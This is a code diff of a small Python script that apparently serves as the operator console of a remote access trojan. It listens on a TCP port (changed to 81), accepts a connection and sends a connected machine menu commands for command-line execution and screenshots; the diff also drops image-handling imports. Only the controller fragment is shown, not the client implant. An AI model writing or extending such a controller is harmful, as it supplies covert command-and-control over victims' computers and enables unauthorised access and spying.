@@ -1,17 +1,11 @@
-import socket, pickle,struct,imutils, sys
-from PIL import Image
-import struct
-import numpy
-import cv2
+import socket, sys
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = ''
-port = 3333
+host = '0.0.0.0'
+port = 81
 s.bind((host, port))
 s.listen(1)
 conn, addr = s.accept()
-print(addr)
-
 while True:
     a = input('/cmd - Сommand line\n/screen - ScreenShot\n > ')
     conn.send(a.encode())
